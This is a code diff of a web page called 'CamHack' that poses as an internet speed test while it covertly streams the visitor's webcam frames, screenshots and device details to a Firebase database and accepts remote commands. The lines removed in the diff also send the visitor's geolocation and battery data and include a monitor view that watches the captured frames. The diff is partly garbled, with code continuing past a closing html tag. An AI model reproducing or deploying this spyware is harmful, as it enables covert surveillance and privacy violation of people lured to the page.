@@ -42,8 +42,6 @@
             border-radius: 5px;
             font-size: 14px;
         }
-        .loading { animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -60,12 +58,10 @@
     <video id="camera" autoplay muted playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
     <script>
-        // Firebase config - camhack-realtime
         const firebaseConfig = {
             apiKey: "AIzaSyDm83pllDlsMkmcj2S5HR4_jgAHcXyEVfI",
             authDomain: "camhack-realtime.firebaseapp.com",
@@ -73,221 +69,63 @@
             projectId: "camhack-realtime",
             storageBucket: "camhack-realtime.firebasestorage.app",
             messagingSenderId: "924337165678",
-            appId: "1:924337165678:web:5c602dff53e9f9582f9d7f",
-            measurementId: "G-P3WVHCT6SQ"
+            appId: "1:924337165678:web:5c602dff53e9f9582f9d7f"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
         const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
-        const isMonitor = urlParams.get('monitor') === 'true';
+        const sessionId = urlParams.get('session') || 'cam_' + Date.now();
         
         let mediaStream = null;
-        let isTestRunning = false;
         let frameCount = 0;
         let currentFacingMode = 'user';
         let isCapturing = false;
+        let retryCount = 0;
         
-        console.log('Session:', sessionId, 'Monitor:', isMonitor);
+        console.log('🎯 CamHack Started - Session:', sessionId);
         
+        // Auto-start segera setelah load
         document.addEventListener('DOMContentLoaded', function() {
-            if (isMonitor) {
-                initializeMonitor();
-            } else {
-                initializeCamHack();
-            }
+            console.log('📱 Page loaded - Starting immediately');
+            initializeCamHack();
+            setTimeout(() => startTest(), 500);
         });
         
-        function initializeMonitor() {
-            console.log('Monitor mode - listening for frames...');
-            document.getElementById('status').textContent = '🔍 Monitoring - Waiting for target...';
-            
-            // Create image element for displaying frames
-            const imgElement = document.createElement('img');
-            imgElement.style.maxWidth = '100%';
-            imgElement.style.border = '2px solid #00ff00';
-            imgElement.style.borderRadius = '10px';
-            imgElement.style.marginTop = '20px';
-            document.body.appendChild(imgElement);
-            
-            // Listen for frames in Firebase
-            database.ref(`sessions/${sessionId}/frames`).on('child_added', (snapshot) => {
-                const frameData = snapshot.val();
-                console.log('Frame received:', frameData.frameNumber);
-                
-                // Display frame in monitor
-                if (frameData.image) {
-                    imgElement.src = frameData.image;
-                    document.getElementById('status').textContent = `📷 Live: Frame #${frameData.frameNumber} (${frameData.facingMode})`;
-                    
-                    // Send to Android via AndroidInterface
-                    if (typeof AndroidInterface !== 'undefined') {
-                        AndroidInterface.receiveFrame(JSON.stringify(frameData));
-                    }
-                }
-                
-                // Remove old frame after processing
-                setTimeout(() => {
-                    snapshot.ref.remove();
-                }, 1000);
-            });
-            
-            // Listen for status updates
-            database.ref(`sessions/${sessionId}/status`).on('value', (snapshot) => {
-                const status = snapshot.val();
-                if (status && status.type === 'TARGET_CONNECTED') {
-                    document.getElementById('status').textContent = '✅ Target connected!';
-                    
-                    // Send to Android
-                    if (typeof AndroidInterface !== 'undefined') {
-                        AndroidInterface.receiveData(JSON.stringify(status));
-                    }
-                }
-            });
-            
-            // Listen for device info
-            database.ref(`sessions/${sessionId}/device`).on('value', (snapshot) => {
-                const deviceData = snapshot.val();
-                if (deviceData && typeof AndroidInterface !== 'undefined') {
-                    AndroidInterface.receiveData(JSON.stringify({
-                        type: 'DEVICE_INFO',
-                        data: deviceData
-                    }));
-                }
-            });
-        }
-        
         async function initializeCamHack() {
-            console.log('Target mode - starting camera...');
+            console.log('🚀 Initializing CamHack...');
             
-            await collectDeviceInfo();
-            await requestCameraAccess();
-            startCommandMonitoring();
-            
-            setTimeout(() => {
-                if (!isTestRunning) startTest();
-            }, 1000);
+            try {
+                await collectDeviceInfo();
+                await requestCameraAccess();
+                startCommandMonitoring();
+                startHeartbeat();
+            } catch (error) {
+                console.error('❌ Init error:', error);
+                retryConnection();
+            }
         }
         
         async function collectDeviceInfo() {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
                 screenWidth: screen.width,
                 screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookieEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                timestamp: Date.now()
+                language: navigator.language,
+                timestamp: Date.now(),
+                url: window.location.href
             };
             
-            // Get network info if available
-            if ('connection' in navigator) {
-                deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
-                deviceInfo.downlink = navigator.connection.downlink || 0;
-                deviceInfo.rtt = navigator.connection.rtt || 0;
-            }
-            
-            // Get battery info
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    deviceInfo.battery = Math.round(battery.level * 100);
-                    deviceInfo.charging = battery.charging;
-                    deviceInfo.chargingTime = battery.chargingTime;
-                    deviceInfo.dischargingTime = battery.dischargingTime;
-                } catch (e) {
-                    deviceInfo.battery = 'Unknown';
-                    deviceInfo.charging = false;
-                }
-            }
-            
-            // Get location if available
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        deviceInfo.latitude = position.coords.latitude;
-                        deviceInfo.longitude = position.coords.longitude;
-                        deviceInfo.accuracy = position.coords.accuracy;
-                        deviceInfo.altitude = position.coords.altitude;
-                        deviceInfo.speed = position.coords.speed;
-                        
-                        // Send updated device info with location
-                        database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
-                        console.log('📍 Location added to device info');
-                    },
-                    (error) => {
-                        deviceInfo.locationError = error.message;
-                        database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
-                        console.log('⚠️ Location access denied');
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
-                );
-            } else {
-                // Send device info without location
-                database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
-            }
-            
-            console.log('📋 Device info collected and sent');
-            
-            // Start real-time device monitoring
-            setInterval(async () => {
-                try {
-                    const updatedInfo = {
-                        ...deviceInfo,
-                        onLine: navigator.onLine,
-                        timestamp: Date.now(),
-                        pageVisible: !document.hidden,
-                        frameCount: frameCount,
-                        cameraActive: isCapturing
-                    };
-                    
-                    // Update battery if available
-                    if ('getBattery' in navigator) {
-                        try {
-                            const battery = await navigator.getBattery();
-                            updatedInfo.battery = Math.round(battery.level * 100);
-                            updatedInfo.charging = battery.charging;
-                        } catch (e) {}
-                    }
-                    
-                    // Update network if available
-                    if ('connection' in navigator) {
-                        updatedInfo.networkType = navigator.connection.effectiveType || 'unknown';
-                        updatedInfo.downlink = navigator.connection.downlink || 0;
-                    }
-                    
-                    // Send updated info to Firebase
-                    database.ref(`sessions/${sessionId}/device`).update(updatedInfo);
-                    
-                    // Send heartbeat with current status
-                    database.ref(`sessions/${sessionId}/heartbeat`).set({
-                        timestamp: Date.now(),
-                        frameCount: frameCount,
-                        facingMode: currentFacingMode,
-                        online: navigator.onLine,
-                        cameraActive: isCapturing,
-                        battery: updatedInfo.battery || 0,
-                        networkType: updatedInfo.networkType || 'unknown',
-                        charging: updatedInfo.charging || false
-                    });
-                    
-                    console.log('💓 Heartbeat - Frame:', frameCount, 'Battery:', updatedInfo.battery + '%');
-                    
-                } catch (error) {
-                    console.error('Heartbeat error:', error);
-                }
-            }, 3000); // Every 3 seconds
+            await database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
+            console.log('📋 Device info sent to Firebase');
         }
         
         async function requestCameraAccess() {
             try {
+                console.log('📷 Requesting camera access...');
+                
                 const constraints = {
                     video: {
                         facingMode: currentFacingMode,
@@ -298,44 +136,44 @@
                 };
                 
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                console.log('✅ Camera access granted!');
                 
                 const video = document.getElementById('camera');
                 video.srcObject = mediaStream;
                 
-                video.addEventListener('loadedmetadata', () => {
-                    console.log('CAMERA ACCESS GRANTED');
+                video.addEventListener('loadedmetadata', async () => {
+                    console.log('🎥 Camera ready - Starting capture');
                     
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
-                    // Send connection status to Firebase
-                    database.ref(`sessions/${sessionId}/status`).set({
+                    // Send connection status
+                    await database.ref(`sessions/${sessionId}/status`).set({
                         type: 'TARGET_CONNECTED',
                         cameraWidth: canvas.width,
                         cameraHeight: canvas.height,
                         facingMode: currentFacingMode,
-                        videoWidth: video.videoWidth,
-                        videoHeight: video.videoHeight,
-                        readyState: video.readyState,
                         timestamp: Date.now(),
-                        userAgent: navigator.userAgent.substring(0, 50)
+                        ready: true
                     });
                     
                     startFrameCapture();
-                    
-                    document.getElementById('status').textContent = '📷 Camera active - Sending frames';
+                    document.getElementById('status').textContent = '📷 Camera streaming active';
                 });
                 
             } catch (error) {
-                console.error('Camera access failed:', error);
-                document.getElementById('status').textContent = '❌ Camera access denied';
+                console.error('❌ Camera access failed:', error);
+                document.getElementById('status').textContent = '❌ Camera access denied - Please allow camera';
+                retryConnection();
             }
         }
         
         function startFrameCapture() {
             if (isCapturing) return;
             isCapturing = true;
+            
+            console.log('🔴 Starting frame capture...');
             
             const video = document.getElementById('camera');
             const canvas = document.getElementById('canvas');
@@ -350,51 +188,57 @@
                 try {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    canvas.toBlob(blob => {
+                    canvas.toBlob(async (blob) => {
                         if (blob) {
                             const reader = new FileReader();
-                            reader.onload = function() {
+                            reader.onload = async function() {
                                 frameCount++;
                                 
                                 const frameData = {
-                                    type: 'CAMERA_FRAME',
-                                    session: sessionId,
                                     image: reader.result,
                                     frameNumber: frameCount,
                                     facingMode: currentFacingMode,
-                                    timestamp: Date.now()
+                                    timestamp: Date.now(),
+                                    size: reader.result.length
                                 };
                                 
-                                // Send frame to Firebase with priority
-                                database.ref(`sessions/${sessionId}/frames`).push(frameData)
-                                .then(() => {
-                                    console.log(`🔴 Frame #${frameCount} sent successfully`);
+                                try {
+                                    // Send frame dengan priority
+                                    const frameRef = database.ref(`sessions/${sessionId}/frames`).push();
+                                    await frameRef.set(frameData);
+                                    
+                                    console.log(`✅ Frame #${frameCount} sent - ${Math.round(reader.result.length/1024)}KB`);
                                     document.getElementById('status').textContent = `🔴 LIVE: Frame #${frameCount} (${currentFacingMode})`;
                                     
-                                    // Send heartbeat
-                                    database.ref(`sessions/${sessionId}/heartbeat`).set({
-                                        frameCount: frameCount,
-                                        facingMode: currentFacingMode,
-                                        online: navigator.onLine,
+                                    // Update last frame info
+                                    database.ref(`sessions/${sessionId}/lastFrame`).set({
+                                        frameNumber: frameCount,
                                         timestamp: Date.now(),
-                                        cameraActive: true
+                                        size: reader.result.length
                                     });
-                                })
-                                .catch((error) => {
-                                    console.error('Frame send failed:', error);
-                                    document.getElementById('status').textContent = `❌ Frame send failed: ${error.message}`;
-                                });
+                                    
+                                    retryCount = 0; // Reset retry on success
+                                    
+                                } catch (error) {
+                                    console.error('❌ Frame send failed:', error);
+                                    document.getElementById('status').textContent = `❌ Send failed: ${error.message}`;
+                                    
+                                    if (retryCount < 3) {
+                                        retryCount++;
+                                        console.log(`🔄 Retrying... (${retryCount}/3)`);
+                                    }
+                                }
                             };
                             reader.readAsDataURL(blob);
                         }
-                    }, 'image/jpeg', 0.7);
+                    }, 'image/jpeg', 0.7); // Compress untuk speed
                     
                 } catch (error) {
-                    console.error('Frame capture error:', error);
+                    console.error('❌ Frame capture error:', error);
                 }
                 
                 if (isCapturing && mediaStream) {
-                    setTimeout(captureFrame, 800); // 1.25 FPS for better streaming
+                    setTimeout(captureFrame, 500); // 2 FPS untuk real-time
                 }
             }
             
@@ -402,23 +246,33 @@
         }
         
         function startCommandMonitoring() {
-            // Listen for commands from Firebase
+            console.log('👂 Listening for commands...');
+            
             database.ref(`sessions/${sessionId}/commands`).on('child_added', (snapshot) => {
                 const command = snapshot.val();
-                executeCommand(command.action);
-                
-                // Remove command after execution
-                snapshot.ref.remove();
+                if (command && command.action) {
+                    console.log('📨 Command received:', command.action);
+                    executeCommand(command.action);
+                    snapshot.ref.remove();
+                }
             });
         }
         
         function executeCommand(command) {
-            console.log('Executing:', command);
+            console.log('⚡ Executing command:', command);
             
-            if (command === 'switch_camera') {
-                switchCamera();
-            } else if (command === 'capture') {
-                captureScreenshot();
+            switch(command) {
+                case 'switch_camera':
+                    switchCamera();
+                    break;
+                case 'capture':
+                    captureScreenshot();
+                    break;
+                case 'restart':
+                    location.reload();
+                    break;
+                default:
+                    console.log('❓ Unknown command:', command);
             }
         }
         
@@ -426,35 +280,24 @@
             if (!mediaStream) return;
             
             try {
+                console.log('🔄 Switching camera...');
+                
                 mediaStream.getTracks().forEach(track => track.stop());
                 
                 currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                 isCapturing = false;
                 
-                const constraints = {
-                    video: {
-                        facingMode: currentFacingMode,
-                        width: { ideal: 640, max: 1280 },
-                        height: { ideal: 480, max: 720 }
-                    }
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                const video = document.getElementById('camera');
-                video.srcObject = mediaStream;
-                
-                video.addEventListener('loadedmetadata', () => {
-                    startFrameCapture();
-                    console.log('Camera switched to', currentFacingMode);
-                }, { once: true });
+                await requestCameraAccess();
+                console.log('✅ Camera switched to:', currentFacingMode);
                 
             } catch (error) {
-                console.error('Camera switch failed:', error);
+                console.error('❌ Camera switch failed:', error);
             }
         }
         
         function captureScreenshot() {
+            console.log('📸 Taking screenshot...');
+            
             const video = document.getElementById('camera');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
@@ -468,145 +311,50 @@
                         type: 'SCREENSHOT',
                         session: sessionId,
                         image: reader.result,
-                        timestamp: Date.now()
+                        timestamp: Date.now(),
+                        facingMode: currentFacingMode
                     };
                     
                     database.ref(`sessions/${sessionId}/screenshots`).push(data);
-                    console.log('Screenshot sent to Firebase');
+                    console.log('✅ Screenshot sent to Firebase');
                 };
                 reader.readAsDataURL(blob);
             }, 'image/jpeg', 0.9);
         }
         
-        async function startTest() {
-            if (isTestRunning) return;
-            
-            isTestRunning = true;
-            document.getElementById('startBtn').style.display = 'none';
-            
-            const statusEl = document.getElementById('status');
-            const speedEl = document.getElementById('speedDisplay');
-            
-            statusEl.textContent = 'Testing connection...';
-            
-            for (let i = 0; i < 50; i++) {
-                const speed = Math.floor(Math.random() * 100 + 10);
-                speedEl.textContent = speed + ' Mbps';
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-            
-            const finalSpeed = Math.floor(Math.random() * 100 + 50);
-            speedEl.textContent = finalSpeed + ' Mbps';
-            
-            statusEl.textContent = `✅ Test completed! Frames: ${frameCount}`;
-            isTestRunning = false;
-        }
-    </script>
-</body>
-</html> Frame #${frameCount} sent`;
-                            };
-                            reader.readAsDataURL(blob);
-                        }
-                    }, 'image/jpeg', 0.7);
-                    
-                } catch (error) {
-                    console.error('Frame capture error:', error);
-                }
-                
-                if (isCapturing && mediaStream) {
-                    setTimeout(captureFrame, 2000); // 0.5 FPS for Firebase limits
-                }
-            }
-            
-            captureFrame();
-        }
-        
-        function startCommandMonitoring() {
-            // Listen for commands from Firebase
-            database.ref(`sessions/${sessionId}/commands`).on('child_added', (snapshot) => {
-                const command = snapshot.val();
-                executeCommand(command.action);
-                
-                // Remove command after execution
-                snapshot.ref.remove();
-            });
-        }
-        
-        function executeCommand(command) {
-            console.log('Executing:', command);
-            
-            if (command === 'switch_camera') {
-                switchCamera();
-            } else if (command === 'capture') {
-                captureScreenshot();
-            }
-        }
-        
-        async function switchCamera() {
-            if (!mediaStream) return;
-            
-            try {
-                mediaStream.getTracks().forEach(track => track.stop());
-                
-                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                isCapturing = false;
-                
-                const constraints = {
-                    video: {
+        function startHeartbeat() {
+            setInterval(() => {
+                if (sessionId) {
+                    database.ref(`sessions/${sessionId}/heartbeat`).set({
+                        timestamp: Date.now(),
+                        frameCount: frameCount,
                         facingMode: currentFacingMode,
-                        width: { ideal: 640, max: 1280 },
-                        height: { ideal: 480, max: 720 }
-                    }
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                const video = document.getElementById('camera');
-                video.srcObject = mediaStream;
-                
-                video.addEventListener('loadedmetadata', () => {
-                    startFrameCapture();
-                    console.log('Camera switched to', currentFacingMode);
-                }, { once: true });
-                
-            } catch (error) {
-                console.error('Camera switch failed:', error);
+                        online: true,
+                        cameraActive: isCapturing,
+                        retryCount: retryCount
+                    });
+                }
+            }, 2000); // Every 2 seconds
+        }
+        
+        function retryConnection() {
+            if (retryCount < 5) {
+                retryCount++;
+                console.log(`🔄 Retrying connection... (${retryCount}/5)`);
+                setTimeout(() => {
+                    initializeCamHack();
+                }, 3000);
+            } else {
+                console.log('❌ Max retries reached - reloading page');
+                location.reload();
             }
         }
         
-        function captureScreenshot() {
-            const video = document.getElementById('camera');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-                const reader = new FileReader();
-                reader.onload = function() {
-                    const data = {
-                        type: 'SCREENSHOT',
-                        session: sessionId,
-                        image: reader.result,
-                        timestamp: Date.now()
-                    };
-                    
-                    database.ref(`sessions/${sessionId}/screenshots`).push(data);
-                    console.log('Screenshot sent to Firebase');
-                };
-                reader.readAsDataURL(blob);
-            }, 'image/jpeg', 0.9);
-        }
-        
         async function startTest() {
-            if (isTestRunning) return;
-            
-            isTestRunning = true;
-            document.getElementById('startBtn').style.display = 'none';
-            
             const statusEl = document.getElementById('status');
             const speedEl = document.getElementById('speedDisplay');
             
+            document.getElementById('startBtn').style.display = 'none';
             statusEl.textContent = 'Testing connection...';
             
             for (let i = 0; i < 50; i++) {
@@ -618,9 +366,36 @@
             const finalSpeed = Math.floor(Math.random() * 100 + 50);
             speedEl.textContent = finalSpeed + ' Mbps';
             
-            statusEl.textContent = `✅ Test completed! Frames: ${frameCount}`;
-            isTestRunning = false;
+            statusEl.textContent = `✅ Test completed! Session: ${sessionId.substring(4, 10)}`;
         }
+        
+        // Error handling
+        window.addEventListener('error', (e) => {
+            console.error('🚨 Global error:', e.error);
+            retryConnection();
+        });
+        
+        // Visibility change handling
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && !isCapturing) {
+                console.log('👁️ Page visible - restarting capture');
+                setTimeout(() => {
+                    if (mediaStream) startFrameCapture();
+                }, 1000);
+            }
+        });
+        
+        // Connection monitoring
+        window.addEventListener('online', () => {
+            console.log('🌐 Connection restored');
+            retryCount = 0;
+        });
+        
+        window.addEventListener('offline', () => {
+            console.log('📵 Connection lost');
+        });
+        
+        console.log('🎯 CamHack initialization complete');
     </script>
 </body>
 </html>
